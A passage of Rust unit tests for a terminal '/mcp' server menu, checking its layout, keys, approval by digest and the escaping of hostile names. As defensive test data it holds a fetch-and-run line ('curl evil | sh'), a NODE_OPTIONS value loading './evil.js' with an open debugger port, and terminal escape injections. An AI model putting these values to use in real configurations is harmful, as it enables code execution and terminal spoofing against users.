//! `/mcp`'s menu, drawn and keyed without a runtime: rows built by hand, as
//! `p5-mcp-menu-new` shows fx v0.0.16's (`cap/mcp/new/fx-p5-mcp-menu-new-40x120-*`).

use super::super::theme::{Depth, Mode};
use super::*;

const PALETTE: Palette = Palette {
    mode: Mode::Dark,
    depth: Depth::Ansi256,
};

/// `row` with its SGR runs taken out and its trailing blanks trimmed, as a
/// capture's `.txt` reads.
fn plain(row: &str) -> String {
    let mut out = String::new();
    let mut chars = row.chars();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            for next in chars.by_ref() {
                if next == 'm' {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out.trim_end().to_string()
}

fn drawn(menu: &McpMenu, cols: u16) -> Vec<String> {
    let count = menu.height(cols, MAX_ROWS, 30);
    menu.rows(cols, count, PALETTE)
        .iter()
        .map(|row| plain(row))
        .collect()
}

fn base(name: &str) -> Row {
    Row {
        name: name.into(),
        source: Source::Profile,
        transport: Transport::Stdio,
        status: String::new(),
        ready: false,
        attention: false,
        bright: false,
        needs_login: false,
        admission: None,
        connection: Connection::Disconnected,
        version: None,
        error: None,
        target: String::new(),
        entry: None,
        found: Found::Waiting,
    }
}

fn ready(name: &str) -> Row {
    Row {
        status: "ready, 1 tool".into(),
        ready: true,
        connection: Connection::Ready,
        version: Some("2025-03-26".into()),
        target: "/opt/homebrew/bin/bun /scenarios/p5-mcp-stdio.ts".into(),
        found: Found::Tools(vec![Tool {
            name: "echo".into(),
            description: "Echo text through the legacy MCP fixture".into(),
        }]),
        ..base(name)
    }
}

fn connecting(name: &str) -> Row {
    Row {
        transport: Transport::Http,
        status: "connecting".into(),
        connection: Connection::Connecting,
        target: "http://127.0.0.1:9/mcp".into(),
        ..base(name)
    }
}

fn pending(name: &str) -> Row {
    Row {
        source: Source::Workspace,
        status: "waiting for approval".into(),
        attention: true,
        bright: true,
        admission: Some(Admission::Pending),
        target: "/opt/homebrew/bin/bun /scenarios/p5-mcp-stdio.ts".into(),
        entry: entry(
            &["command: /opt/homebrew/bin/bun /scenarios/p5-mcp-stdio.ts"],
            "digest-a",
        ),
        found: Found::Held("the project server is waiting for approval".into()),
        ..base(name)
    }
}

/// An entry as the runtime shows it: its rows, spelled already, and its digest.
fn entry(rows: &[&str], digest: &str) -> Option<Arc<ShownEntry>> {
    Some(Arc::new(ShownEntry {
        rows: rows.iter().map(|row| row.to_string()).collect(),
        digest: digest.into(),
    }))
}

fn three() -> McpMenu {
    McpMenu::open(
        vec![ready("fixture"), connecting("remote"), pending("proj")],
        0,
        Instant::now(),
    )
}

#[test]
fn the_list_is_fxs_picker_working_servers_first_then_the_ones_that_need_attention() {
    // `fx-p5-mcp-menu-new-40x120-list.txt`, rows 5-10 and 12.
    let menu = three();
    assert_eq!(
        drawn(&menu, 120),
        [
            "  MCP servers  3",
            "\u{203a} fixture                 ready, 1 tool           profile",
            "  remote                  connecting              profile",
            "",
            "  Needs attention  1",
            "  proj                    waiting for approval    project",
        ]
    );
    assert_eq!(
        menu.key_help(120),
        "\u{2191}\u{2193} navigate     enter open     esc close"
    );
    // The selected row bold 255 with `› `, the others dim; a status that
    // needs the person 255, not bold (`-list.ansi`).
    let rows = menu.rows(120, 6, PALETTE);
    assert!(
        rows[1].starts_with("\u{1b}[1;38;5;255m\u{203a} fixture"),
        "{:?}",
        rows[1]
    );
    assert!(
        rows[2].starts_with("\u{1b}[38;5;245m  remote"),
        "{:?}",
        rows[2]
    );
    assert!(
        rows[5].contains("\u{1b}[38;5;255mwaiting for approval"),
        "{:?}",
        rows[5]
    );
}

#[test]
fn no_servers_points_to_add_and_its_hint_only_closes() {
    // `fx-p5-mcp-empty-40x120-menu.txt`, rows 5-7 and 9.
    let mut menu = McpMenu::open(Vec::new(), 0, Instant::now());
    assert_eq!(
        drawn(&menu, 120),
        [
            "  MCP servers  none yet",
            "  Add one with /mcp add NAME URL",
            "           or /mcp add NAME -- COMMAND",
        ]
    );
    assert_eq!(menu.key_help(120), "esc close");
    // Down and Right change nothing; Escape closes (`-menu-down`,
    // `-menu-right`, `-menu-esc`).
    assert_eq!(menu.press(Key::Down), Effect::None);
    assert_eq!(menu.press(Key::Right), Effect::None);
    assert_eq!(menu.press(Key::Escape), Effect::Close);
    // A config note takes the last row, with or without servers.
    let noted = McpMenu::open(Vec::new(), 2, Instant::now());
    assert_eq!(
        drawn(&noted, 120).last().map(String::as_str),
        Some("  2 config notes: /mcp list shows them")
    );
    let one = McpMenu::open(vec![ready("fixture")], 1, Instant::now());
    assert_eq!(
        drawn(&one, 120),
        [
            "  MCP servers  1",
            "\u{203a} fixture                 ready, 1 tool           profile",
            "  1 config note: /mcp list shows it",
        ]
    );
}

#[test]
fn the_filter_keeps_matching_names_and_says_when_none_match() {
    // `-list-filter`: `re` keeps fixture and remote.
    let mut menu = three();
    menu.set_filter("re");
    assert_eq!(
        drawn(&menu, 120),
        [
            "  MCP servers  2 of 3",
            "\u{203a} fixture                 ready, 1 tool           profile",
            "  remote                  connecting              profile",
        ]
    );
    menu.set_filter("PROJ");
    assert_eq!(
        drawn(&menu, 120),
        [
            "  MCP servers  1 of 3",
            "  Needs attention  1",
            "\u{203a} proj                    waiting for approval    project",
        ]
    );
    menu.set_filter("zz\u{1b}[2J");
    assert_eq!(
        drawn(&menu, 120),
        [
            "  MCP servers  0 of 3",
            "  No server matches \"zz\\x1b[2J\""
        ]
    );
    // Nothing to open, so Enter opens nothing.
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::List);
}

#[test]
fn down_follows_the_groups_and_the_selection_is_kept_by_name() {
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Down);
    assert!(drawn(&menu, 120)[5].starts_with("\u{203a} proj"));
    // The last row stays the last: no wrap.
    menu.press(Key::Down);
    assert!(drawn(&menu, 120)[5].starts_with("\u{203a} proj"));
    // A read that drops a server above keeps proj selected.
    menu.take(vec![ready("fixture"), pending("proj")], 0);
    let rows = drawn(&menu, 120);
    assert!(
        rows.iter().any(|row| row.starts_with("\u{203a} proj")),
        "{rows:?}"
    );
    menu.press(Key::Up);
    assert!(drawn(&menu, 120)[1].starts_with("\u{203a} fixture"));
    menu.press(Key::Up);
    assert!(drawn(&menu, 120)[1].starts_with("\u{203a} fixture"));
}

#[test]
fn a_servers_screen_is_its_facts_its_choices_with_their_commands_and_its_tools() {
    // `-server-fixture`, `-server-fixture-tool`, `-server-fixture-nomatch`.
    let mut menu = three();
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Server);
    assert_eq!(
        drawn(&menu, 120),
        [
            "  fixture",
            "  runs      /opt/homebrew/bin/bun /scenarios/p5-mcp-stdio.ts",
            "  file      ~/.xfx/mcp.json",
            "  status    ready",
            "  protocol  2025-03-26",
            "",
            "\u{203a} Remove        /mcp remove fixture",
            "",
            "  Tools 1",
            "  echo                  Echo text through the legacy MCP fixture",
        ]
    );
    assert_eq!(
        menu.key_help(120),
        "\u{2191}\u{2193} navigate     enter run     esc back"
    );
    menu.press(Key::Down);
    let rows = drawn(&menu, 120);
    assert_eq!(rows[6], "  Remove        /mcp remove fixture");
    assert_eq!(
        rows[9],
        "\u{203a} echo                  Echo text through the legacy MCP fixture"
    );
    assert_eq!(menu.key_help(120), "\u{2191}\u{2193} navigate     esc back");
    // Enter on a tool does nothing.
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Server);
    // A filter keeps tools by name or description; none left says so, and
    // the selection goes back to the first choice.
    menu.set_filter("zzz");
    let rows = drawn(&menu, 120);
    assert_eq!(rows[6], "\u{203a} Remove        /mcp remove fixture");
    assert_eq!(rows[8], "  No tools match.");
    assert_eq!(rows.len(), 9);
    menu.set_filter("LEGACY");
    let rows = drawn(&menu, 120);
    assert_eq!(rows[8], "  Tools 1 of 1");
    assert!(rows[9].starts_with("\u{203a} echo"), "{rows:?}");
    // Escape goes back to the list, the selection where it was.
    menu.set_filter("");
    assert_eq!(menu.press(Key::Escape), Effect::None);
    assert_eq!(menu.screen(), Screen::List);
    assert!(drawn(&menu, 120)[1].starts_with("\u{203a} fixture"));
}

#[test]
fn a_remote_server_still_coming_up_is_loading_its_tools() {
    // `-server-remote`.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Enter);
    assert_eq!(
        drawn(&menu, 120),
        [
            "  remote",
            "  http      http://127.0.0.1:9/mcp",
            "  file      ~/.xfx/mcp.json",
            "  status    connecting",
            "",
            "\u{203a} Remove        /mcp remove remote",
            "",
            "  Loading tools\u{2026}",
        ]
    );
    // Its tools arrive with the read that finds it ready.
    let mut up = ready("remote");
    up.transport = Transport::Http;
    up.target = "http://127.0.0.1:9/mcp".into();
    menu.take(vec![ready("fixture"), up, pending("proj")], 0);
    assert_eq!(drawn(&menu, 120)[8], "  Tools 1");
}

#[test]
fn remove_asks_on_its_own_row_and_only_yes_runs_it() {
    // `-remove-inplace`, `-remove-no`, `-remove-cancel`.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Enter);
    let before = menu.height(120, MAX_ROWS, 30);
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    assert!(menu.asks_on_row());
    // At the same size, the question on Remove's row, the hint the server's.
    assert_eq!(menu.height(120, MAX_ROWS, 30), before);
    assert_eq!(
        drawn(&menu, 120)[5],
        "\u{203a} Remove remote from ~/.xfx/mcp.json?   yes  no"
    );
    assert_eq!(
        menu.key_help(120),
        "\u{2191}\u{2193} navigate     enter run     esc back"
    );
    let answers = |menu: &McpMenu| {
        let row = &menu.rows(120, 8, PALETTE)[5];
        (
            row.contains("\u{1b}[1;38;5;255myes"),
            row.contains("\u{1b}[1;38;5;255mno"),
        )
    };
    assert_eq!(answers(&menu), (true, false));
    // ↑↓ move nothing; → chooses no, ← yes again.
    menu.press(Key::Down);
    menu.press(Key::Up);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    menu.press(Key::Right);
    assert_eq!(answers(&menu), (false, true));
    // Enter on no runs nothing and goes back to the server.
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Server);
    assert_eq!(
        drawn(&menu, 120)[5],
        "\u{203a} Remove        /mcp remove remote"
    );
    // Escape cancels too.
    menu.press(Key::Enter);
    assert_eq!(menu.press(Key::Escape), Effect::None);
    assert_eq!(menu.screen(), Screen::Server);
    // Asked again it starts on yes; → then ← keeps yes, and Enter -- once a
    // frame drew the question -- removes, from the file the question named,
    // and goes back to the list.
    menu.press(Key::Enter);
    menu.press(Key::Right);
    menu.press(Key::Left);
    drawn(&menu, 120);
    assert_eq!(
        menu.press(Key::Enter),
        Effect::Run(Run::Remove {
            name: "remote".into(),
            file: File::Profile,
        })
    );
    assert_eq!(menu.screen(), Screen::List);
}

#[test]
fn reject_asks_on_its_row_and_approve_keeps_a_screen_that_shows_what_it_trusts() {
    // `-server-proj`, `-reject-inplace`, `-approve-confirm`.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    assert_eq!(
        drawn(&menu, 120),
        [
            "  proj",
            "  runs      /opt/homebrew/bin/bun /scenarios/p5-mcp-stdio.ts",
            "  file      .mcp.json",
            "  status    waiting for approval",
            "",
            "\u{203a} Approve       /mcp approve proj",
            "  Reject        /mcp reject proj",
            "  Remove        /mcp remove proj",
            "",
            "  Its tools show here once you approve it.",
        ]
    );
    menu.press(Key::Down);
    menu.press(Key::Enter);
    assert_eq!(
        drawn(&menu, 120)[6],
        "\u{203a} Reject proj? xfx won't start it in this project.   yes  no"
    );
    assert_eq!(
        menu.press(Key::Enter),
        Effect::Run(Run::Reject {
            name: "proj".into()
        })
    );
    assert_eq!(menu.screen(), Screen::Server);

    menu.press(Key::Up);
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Approve));
    assert!(!menu.asks_on_row());
    // ← and → choose nothing on an approval.
    menu.press(Key::Right);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Approve));
    assert_eq!(
        drawn(&menu, 120),
        [
            "  proj  waiting for approval",
            "",
            "  Approve proj for this project? It runs:",
            "    /opt/homebrew/bin/bun /scenarios/p5-mcp-stdio.ts",
        ]
    );
    assert_eq!(menu.key_help(120), "enter confirm     esc cancel");
    // The entry it drew is what Enter approves, by its digest.
    assert_eq!(
        menu.press(Key::Enter),
        Effect::Run(Run::Approve {
            name: "proj".into(),
            digest: "digest-a".into(),
        })
    );
    assert_eq!(menu.screen(), Screen::Server);
}

#[test]
fn an_approval_wraps_what_it_trusts_at_spaces_and_never_cuts_it() {
    // fx's own case (presentation `:728-749`): the target wrapped at
    // width - 4 -- and, where fx's goes on four columns in, every piece led
    // by `↳ ` (opus-B; `docs/parity.md`, `/mcp`).
    let mut long = pending("docs");
    long.entry = entry(
        &["command: node ./scripts/docs-server.js --root . --port 4100 --watch"],
        "d",
    );
    let mut menu = McpMenu::open(vec![long], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    assert_eq!(
        drawn(&menu, 48),
        [
            "  docs  waiting for approval",
            "",
            "  Approve docs for this project? It runs:",
            "    node ./scripts/docs-server.js --root .",
            "  \u{21b3} --port 4100 --watch",
        ]
    );
    // Longer than the menu's thirteen rows: the screen takes the room it
    // needs, and every piece is on it.
    let words: Vec<String> = (0..200).map(|i| format!("w{i:03}")).collect();
    let mut huge = pending("huge");
    huge.entry = entry(&[&format!("command: /bin/echo {}", words.join(" "))], "d");
    let mut menu = McpMenu::open(vec![huge], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    let count = menu.height(60, MAX_ROWS, 40);
    assert!(count > MAX_ROWS, "{count}");
    let rows = menu.rows(60, count, PALETTE);
    let shown: String = rows
        .iter()
        .map(|row| plain(row))
        .collect::<Vec<_>>()
        .join(" ");
    assert!(shown.contains("w000") && shown.contains("w199"), "{shown}");
    assert!(!shown.contains('\u{2026}'), "{shown}");
}

#[test]
fn an_approval_shows_each_variable_and_header_as_written_its_wrapped_rows_led() {
    // xfx's rule (`c4d252f5`): what the child is given, every value as
    // written; a row the width wraps goes on behind `↳ `, so the rest of a
    // value never reads as a variable of its own.
    let mut env = pending("proj");
    env.entry = entry(
        &[
            "command: /bin/sh server.sh",
            "env: PATH=./x:${PATH}",
            "env: NODE_OPTIONS=--require ./evil.js --inspect=0.0.0.0:9229 --max-old-space-size=4096",
        ],
        "d",
    );
    let mut menu = McpMenu::open(vec![env], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    assert_eq!(
        drawn(&menu, 60),
        [
            "  proj  waiting for approval",
            "",
            "  Approve proj for this project? It runs:",
            "    /bin/sh server.sh",
            "    env: PATH=./x:${PATH}",
            "    env: NODE_OPTIONS=--require ./evil.js",
            "  \u{21b3} --inspect=0.0.0.0:9229 --max-old-space-size=4096",
        ]
    );
    let mut http = pending("web");
    http.transport = Transport::Http;
    http.entry = entry(
        &[
            "url: https://example.test/mcp",
            "header: X-Team: blue",
            "header: X-Key: ${KEY}",
            "header: Authorization: Bearer ${TOKEN}",
        ],
        "d",
    );
    let mut menu = McpMenu::open(vec![http], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    assert_eq!(
        drawn(&menu, 120)[2..],
        [
            "  Approve web for this project? It connects to:",
            "    https://example.test/mcp",
            "    header: X-Team: blue",
            "    header: X-Key: ${KEY}",
            "    header: Authorization: Bearer ${TOKEN}",
        ]
    );
}

#[test]
fn a_row_too_long_to_show_is_shortened_saying_so_and_approves_nothing() {
    let middle = "m".repeat(3000);
    let mut long = pending("p");
    long.entry = entry(
        &[&format!(
            "command: /bin/sh -c 'HEAD-MARK {middle} TAIL-MARK'"
        )],
        "d",
    );
    let mut menu = McpMenu::open(vec![long], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    let count = menu.height(120, MAX_ROWS, 40);
    let shown: String = menu
        .rows(120, count, PALETTE)
        .iter()
        .map(|row| plain(row))
        .collect::<Vec<_>>()
        .join(" ");
    assert!(
        shown.contains("HEAD-MARK") && shown.contains("TAIL-MARK"),
        "{shown}"
    );
    assert!(
        shown.contains("[3033 bytes in all; .mcp.json has every byte]"),
        "{shown}"
    );
    assert_eq!(
        menu.press(Key::Enter),
        Effect::Refused(
            "A row of p's entry is too long to show here whole, so nothing was approved: .mcp.json has every byte, and /mcp approve p approves the entry as xfx read it.".into()
        )
    );
}

#[test]
fn approve_binds_only_the_entry_its_screen_drew_whole() {
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    // No frame of it yet: Enter waits for one.
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Approve));
    drawn(&menu, 120);
    // A read finds the entry rewritten before the next frame: what Enter
    // would approve is not what was drawn, so nothing is.
    let mut rewritten = pending("proj");
    rewritten.entry = entry(&["command: /bin/sh -c 'curl evil | sh'"], "digest-b");
    menu.take(vec![ready("fixture"), connecting("remote"), rewritten], 0);
    assert_eq!(
        menu.press(Key::Enter),
        Effect::Refused(
            "proj changed in .mcp.json since xfx showed it; nothing was approved.".into()
        )
    );
    assert_eq!(menu.screen(), Screen::Server);
    // Shown again, it approves what that frame drew.
    menu.press(Key::Enter);
    assert!(drawn(&menu, 120)[3].contains("curl evil"));
    assert_eq!(
        menu.press(Key::Enter),
        Effect::Run(Run::Approve {
            name: "proj".into(),
            digest: "digest-b".into(),
        })
    );
    // A frame that could not show all of it approves nothing.
    menu.press(Key::Enter);
    let short = menu.rows(120, 3, PALETTE);
    assert_eq!(short.len(), 3);
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Refused(why) if why.contains("couldn't show all")
    ));
    // Nor does one written over since.
    menu.press(Key::Enter);
    drawn(&menu, 120);
    menu.forget_drawn();
    assert!(matches!(menu.press(Key::Enter), Effect::Refused(_)));
}

#[test]
fn an_approved_server_offers_reject_and_remove_and_its_tools_load() {
    // `-approved`, then `-rejected`: fx keeps the tools it loaded.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    let mut proj = ready("proj");
    proj.source = Source::Workspace;
    proj.admission = Some(Admission::Approved);
    menu.take(vec![ready("fixture"), connecting("remote"), proj], 0);
    assert_eq!(
        drawn(&menu, 120),
        [
            "  proj",
            "  runs      /opt/homebrew/bin/bun /scenarios/p5-mcp-stdio.ts",
            "  file      .mcp.json",
            "  status    ready",
            "  protocol  2025-03-26",
            "",
            "\u{203a} Reject        /mcp reject proj",
            "  Remove        /mcp remove proj",
            "",
            "  Tools 1",
            "  echo                  Echo text through the legacy MCP fixture",
        ]
    );
    let mut rejected = pending("proj");
    rejected.admission = Some(Admission::Rejected);
    rejected.status = "rejected".into();
    rejected.attention = false;
    rejected.bright = false;
    rejected.found = Found::Held("the project server was rejected".into());
    menu.take(vec![ready("fixture"), connecting("remote"), rejected], 0);
    let rows = drawn(&menu, 120);
    assert_eq!(rows[3], "  status    rejected");
    assert_eq!(rows[5], "\u{203a} Approve       /mcp approve proj");
    assert_eq!(rows[6], "  Remove        /mcp remove proj");
    assert_eq!(
        rows[9],
        "  echo                  Echo text through the legacy MCP fixture"
    );
}

#[test]
fn a_server_that_goes_away_takes_its_screen_back_to_the_list() {
    let mut menu = three();
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    menu.take(vec![connecting("remote"), pending("proj")], 0);
    assert_eq!(menu.screen(), Screen::List);
    assert!(drawn(&menu, 120)[1].starts_with("\u{203a} remote"));
}

#[test]
fn a_narrow_screen_drops_the_source_column_then_the_commands() {
    // B15: the source column at >= 64, the command column at >= 56, the name
    // `clamp(w/4, 12, 22)` (presentation `:231-262`, `:313`).
    let menu = three();
    assert_eq!(
        drawn(&menu, 60),
        [
            "  MCP servers  3",
            "\u{203a} fixture          ready, 1 tool",
            "  remote           connecting",
            "",
            "  Needs attention  1",
            "  proj             waiting for approval",
        ]
    );
    assert_eq!(
        drawn(&menu, 48),
        [
            "  MCP servers  3",
            "\u{203a} fixture       ready, 1 tool",
            "  remote        connecting",
            "",
            "  Needs attention  1",
            "  proj          waiting for approval",
        ]
    );
    assert_eq!(
        menu.key_help(40),
        "\u{2191}\u{2193} navigate     enter open     esc close"
    );
    assert_eq!(menu.key_help(30), "\u{2191}\u{2193} move  enter open  esc");
    let mut server = three();
    server.press(Key::Enter);
    assert_eq!(
        drawn(&server, 60)[6],
        "\u{203a} Remove        /mcp remove fixture"
    );
    assert_eq!(drawn(&server, 52)[6], "\u{203a} Remove");
    for cols in [20u16, 40, 52, 60, 64, 120] {
        for row in server.rows(cols, server.height(cols, MAX_ROWS, 30), PALETTE) {
            assert!(cells(&plain(&row)) <= usize::from(cols), "{cols}: {row:?}");
        }
    }
}

#[test]
fn a_long_tool_list_scrolls_with_the_selection_and_counts_whats_below() {
    // fx's own case (presentation `:708-726`).
    let mut many = ready("github");
    many.found = Found::Tools(
        (0..30)
            .map(|i| Tool {
                name: format!("tool{i:02}"),
                description: String::new(),
            })
            .collect(),
    );
    let mut menu = McpMenu::open(vec![many], 0, Instant::now());
    menu.press(Key::Enter);
    for _ in 0..12 {
        menu.press(Key::Down);
    }
    assert_eq!(menu.height(60, MAX_ROWS, 30), MAX_ROWS);
    let rows = drawn(&menu, 60);
    assert!(
        rows.iter().any(|row| row.starts_with("\u{203a} tool11")),
        "{rows:?}"
    );
    assert!(
        rows.last().is_some_and(|row| row.ends_with("more below")),
        "{rows:?}"
    );
    assert!(!rows.iter().any(|row| row.contains("above")));
}

#[test]
fn every_name_target_error_and_tool_is_spelled_and_a_name_stops_at_its_equals_sign() {
    // S4: what the configuration and a server supply never reaches the
    // terminal as a sequence, and a name is said only as far as its first
    // `=` -- a value after one may be a secret, as the verbs cut it.
    // Short enough that no row's width cuts it before its `=` would.
    let hostile = "e\u{1b}[2J=SECRET";
    let mut row = pending(hostile);
    // The entry's rows as the runtime spells them for a person asked about
    // it (`entry_rows`, the approval view's spelling).
    let mut config = crate::mcp::config::ServerConfig::local(
        hostile,
        "/bin/sh",
        &["-c".into(), "x\u{1b}]0;owned\u{7}y\u{202e}z".into()],
    );
    config.env = vec![("API_KEY".into(), "k\u{202e}v\nw".into())];
    row.entry = Some(Arc::new(ShownEntry {
        rows: crate::mcp::runtime::entry_rows(&config),
        digest: "d".into(),
    }));
    row.error = Some("boom\u{1b}[31m".into());
    let mut ok = ready("tools\u{9b}x");
    ok.found = Found::Tools(vec![Tool {
        name: "t\u{1b}]0;x\u{7}".into(),
        description: "d\u{7}e".into(),
    }]);
    let mut menu = McpMenu::open(vec![ok, row], 0, Instant::now());
    let mut screens: Vec<String> = Vec::new();
    let mut take = |menu: &McpMenu| {
        for cols in [60u16, 120] {
            screens.extend(menu.rows(cols, menu.height(cols, MAX_ROWS, 30), PALETTE));
        }
        screens.push(menu.key_help(120));
    };
    // The list, the working server's screen on its tool, the project
    // server's screen, its Reject question, and its approval.
    take(&menu);
    menu.press(Key::Enter);
    menu.press(Key::Down);
    take(&menu);
    menu.press(Key::Escape);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    take(&menu);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    take(&menu);
    menu.press(Key::Escape);
    menu.press(Key::Up);
    menu.press(Key::Enter);
    take(&menu);
    let all = screens.join("\n");
    // Every escape left is one of the palette's own SGR runs.
    let mut rest = all.as_str();
    while let Some(at) = rest.find('\u{1b}') {
        let tail = &rest[at..];
        let end = tail.find('m').expect("an SGR run");
        assert!(
            tail[1..end].starts_with('[')
                && tail[2..end].chars().all(|c| c.is_ascii_digit() || c == ';'),
            "not an SGR run: {:?}",
            &tail[..end.min(20)]
        );
        rest = &tail[end + 1..];
    }
    assert!(!all.contains('\u{7}') && !all.contains('\u{9b}') && !all.contains('\u{202e}'));
    assert!(!all.contains("SECRET"), "{all}");
    assert!(all.contains("e\\x1b[2J="), "{all}");
    assert!(all.contains("owned") && all.contains("\\u{202e}z"), "{all}");
    assert!(all.contains("boom\\x1b[31m"), "{all}");
    assert!(all.contains("t\\x1b]0;x\\x07"), "{all}");
    assert!(all.contains("env: API_KEY=k\\u{202e}v\\x0aw"), "{all}");
    // The choice still runs on the name as configured.
    let mut menu = McpMenu::open(vec![pending(hostile)], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    drawn(&menu, 120);
    assert_eq!(
        menu.press(Key::Enter),
        Effect::Run(Run::Reject {
            name: hostile.into()
        })
    );
}

#[test]
fn a_server_that_needs_a_login_says_sign_in_is_unavailable_and_offers_no_login() {
    // B7/B8 gated: no `Log in` or `Log out` choice, and xfx's sentence where
    // fx says its tools show once you log in.
    let mut login = connecting("linear");
    login.needs_login = true;
    login.status = "needs login".into();
    login.attention = true;
    login.bright = true;
    login.error = Some("it needs a login".into());
    login.found = Found::NeedsLogin;
    let mut menu = McpMenu::open(vec![login], 0, Instant::now());
    menu.press(Key::Enter);
    assert_eq!(
        drawn(&menu, 80),
        [
            "  linear",
            "  http      http://127.0.0.1:9/mcp",
            "  file      ~/.xfx/mcp.json",
            "  status    needs login",
            "",
            "\u{203a} Remove        /mcp remove linear",
            "",
            "  Interactive MCP authentication is unavailable here.",
        ]
    );
}

#[test]
fn the_kept_list_filter_is_never_cut_inside_a_character() {
    let mut menu = three();
    let long = format!("{}\u{e9}", "a".repeat(NAME_CAPACITY - 1));
    menu.keep_list_filter(&long);
    assert_eq!(menu.list_filter().len(), NAME_CAPACITY - 1);
    menu.keep_list_filter("dat");
    assert_eq!(menu.list_filter(), "dat");
}

// --- MCP-Mc ------------------------------------------------------------------

/// `config`'s rows as the runtime shows them for approval, with digest `d`.
fn shown(config: &crate::mcp::config::ServerConfig) -> Option<Arc<ShownEntry>> {
    Some(Arc::new(ShownEntry {
        rows: crate::mcp::runtime::entry_rows(config),
        digest: "d".into(),
    }))
}

/// The approval's rows below its question, at `cols`.
fn approval_body(row: Row, cols: u16) -> Vec<String> {
    let mut menu = McpMenu::open(vec![row], 0, Instant::now());
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    let rows = drawn(&menu, cols);
    assert!(rows[2].starts_with("  Approve "), "{rows:?}");
    rows[3..].to_vec()
}

#[test]
fn a_one_row_address_never_draws_a_wrapped_piece_as_a_header_row() {
    // opus-B MUST: a command line or an address the width wraps went on four
    // columns in, as a row of the entry's own does, so `.mcp.json` could
    // draw a variable or a header the child is never given. Every piece a
    // row wraps onto is led by `↳ `, whatever the entry holds. An address
    // `validate_endpoint` takes, at any width:
    use crate::mcp::config::ServerConfig;
    let url = format!(
        "https://a.example/mcp?q={}header: X-Team: blue",
        " ".repeat(300)
    );
    let mut http = pending("web");
    http.transport = Transport::Http;
    http.entry = shown(&ServerConfig::http("web", &url));
    for cols in [40u16, 60, 120] {
        let body = approval_body(http.clone(), cols);
        assert!(body[0].starts_with("    https://"), "{cols}: {body:?}");
        for row in &body[1..] {
            assert!(
                row.starts_with("  \u{21b3} "),
                "{cols}: {row:?} in {body:?}"
            );
        }
    }
}

#[test]
fn a_one_row_command_line_never_draws_a_wrapped_piece_as_a_variable_row() {
    // The same for a command line, whose bare words line up with the width:
    // `/bin/sh server.sh env: PATH=./x` at 22-26 columns is the entry
    // "`/bin/sh server.sh` with `PATH=./x`" unless its second piece is led.
    use crate::mcp::config::ServerConfig;
    let mut stdio = pending("proj");
    stdio.entry = shown(&ServerConfig::local(
        "proj",
        "/bin/sh",
        &["server.sh".into(), "env:".into(), "PATH=./x".into()],
    ));
    for cols in 22u16..=26 {
        let body = approval_body(stdio.clone(), cols);
        assert_eq!(body[0], "    /bin/sh server.sh", "{cols}: {body:?}");
        assert_eq!(body[1], "  \u{21b3} env: PATH=./x", "{cols}: {body:?}");
    }
}

#[test]
fn remove_and_reject_take_no_answer_before_a_frame_painted_the_question() {
    // opus-C, gpt6-C: as Approve takes no Enter before a frame drew it,
    // Remove and Reject take no answer before a frame drew their question --
    // a burst of Enters in one read never answers one nobody saw.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Enter);
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    assert_eq!(menu.press(Key::Enter), Effect::None);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    drawn(&menu, 120);
    // Written over since: no frame known to show it.
    menu.forget_drawn();
    assert_eq!(menu.press(Key::Enter), Effect::None);
    drawn(&menu, 120);
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Run(Run::Remove { .. })
    ));
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Reject));
    assert_eq!(menu.press(Key::Enter), Effect::None);
    drawn(&menu, 120);
    assert!(matches!(
        menu.press(Key::Enter),
        Effect::Run(Run::Reject { .. })
    ));
}

#[test]
fn a_question_whose_server_moved_to_the_other_file_is_cancelled() {
    // gpt6-C: the removal is of the name and the file the question named;
    // a read that finds the name in the other file now cancels it.
    let mut menu = three();
    menu.press(Key::Down);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    menu.press(Key::Down);
    menu.press(Key::Down);
    menu.press(Key::Enter);
    assert_eq!(menu.screen(), Screen::Confirm(Choice::Remove));
    assert!(drawn(&menu, 120)[7].contains("Remove proj from .mcp.json?"));
    let mut moved = ready("proj");
    moved.source = Source::Profile;
